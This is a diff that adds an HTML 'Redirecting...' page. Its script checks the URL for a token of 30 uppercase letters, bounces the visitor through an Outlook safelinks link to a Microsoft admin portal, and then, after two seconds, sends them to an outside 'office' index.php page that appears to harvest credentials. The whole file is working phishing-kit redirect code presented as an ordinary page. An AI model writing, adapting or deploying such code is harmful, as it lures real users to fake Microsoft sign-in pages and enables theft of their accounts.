@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // First redirect URL (temporary page before final destination)
+        const firstRedirectUrl = "https://nam13.safelinks.protection.outlook.com/?url=https%3A%2F%2Fnam.safelink.emails.azure.net%2Fredirect%2F%3Fdestination%3Dhttps%253A%252F%252Fadmin.microsoft.com%252Fadminportal%252Fhome%253F%2526source%253Dtcemail%2523%252Fsubscriptions%26p%3DbT1lZGFjMWRhOC1mZTYzLTQyZDctYTA2ZC0wYzRkNmMxOWM2Yjcmcz0wMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAmdT1hZW8mbD1ob21l&data=05%7C02%7Ccrensrealty%40msrf-in.top%7C03451cc105414b0ad40a08dd45dd0505%7C597fb9b887c74d4e80ca0b67b628eb2d%7C0%7C0%7C638743537792249425%7CUnknown%7CTWFpbGZsb3d8eyJFbXB0eU1hcGkiOnRydWUsIlYiOiIwLjAuMDAwMCIsIlAiOiJXaW4zMiIsIkFOIjoiTWFpbCIsIldUIjoyfQ%3D%3D%7C0%7C%7C%7C&sdata=dWDT2rjHZA%2BHJ2Mg02bvBCLBXgtMcL%2Ft2qU5EB1QRNc%3D&reserved=0";
+
+        // Final destination URL
+        const finalRedirectUrl = "https://m3.ryltvk6.sa.com/m3.secure.zcore/office-3D8/index.php";
+
+        // Function to generate a random string of mixed characters (80 characters)
+        function generateRandomString(length) {
+            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let result = "";
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        // Function to extract the unnamed query parameter after '?='
+        function getUnnamedQueryParam() {
+            const query = window.location.search;
+            const match = query.match(/^\?=([A-Z]{30})$/); // Matches "?=30-uppercase-letters"
+            return match ? match[1] : null;
+        }
+
+        // Extract and validate the 30-character uppercase string from the URL
+        const upperString = getUnnamedQueryParam();
+
+        if (upperString) {
+            // Generate a random 80-character string
+            const randomString = generateRandomString(80);
+
+            // Perform the first redirect (temporary page)
+            setTimeout(() => {
+                window.location.href = firstRedirectUrl;
+            }, 100); // Redirect to intermediate URL almost instantly
+
+            // Perform the final redirect after 2 seconds (fallback method)
+            setTimeout(() => {
+                window.location.href = `${finalRedirectUrl}?=${randomString}`;
+            }, 2000); // 2-second delay before final redirect
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
